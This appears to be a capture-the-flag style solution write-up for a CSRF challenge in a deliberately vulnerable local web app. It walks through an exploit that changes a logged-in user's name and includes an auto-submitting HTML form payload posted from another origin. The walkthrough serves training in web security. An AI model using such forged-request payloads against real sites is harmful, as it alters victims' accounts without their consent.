# CSRF

**Difficulty**: :star2::star2::star2:

**Description**: Change the name of a user by performing Cross-Site Request Forgery from [another origin](http://htmledit.squarefree.com/).

**Category**: Broken Access Control

**Tags**:

**Solution**:

Tested on:
- Windows 11
- Firefox: [60.0.2/win64/en-US](https://ftp.mozilla.org/pub/firefox/releases/60.0.2/win64/en-US/Firefox%20Setup%2060.0.2.exe)

> NOTE: New Firefox version can't perform this attack❗.

> NOTE: Firefox version 60.0.2 won't display modal or navigate bar normally, so I suggest you navigate between pages using URL.

First, log in to the user account and navigate to route `localhost:3000/profile`:

![login](https://user-images.githubusercontent.com/64480713/180457006-2225a54c-5249-4799-b472-efd95509daa3.png)

Then open http://htmledit.squarefree.com/ as a new tab:

> NOTE: Open with `http` as intended.

![live HTML editor](https://user-images.githubusercontent.com/64480713/180457493-cb81f9e7-4446-4528-8ca9-0fef6590695d.png)

Then paste the code below to the HTML live editor:

```html
<form action="http://localhost:3000/profile" method="POST">
  <input name="username" value="DuckyMomo20012"/>
  <input type="submit"/>
</form>
<script>document.forms[0].submit();</script>
```

The attack will be performed **immediately**:

![CSRF attack](https://user-images.githubusercontent.com/64480713/180457737-f06682c3-0113-48e5-b8db-6965b2894275.png)

Then reload the profile page to see changes:

![result](https://user-images.githubusercontent.com/64480713/180457852-255de565-3977-4bb6-bd9b-7579fab1db0c.png)

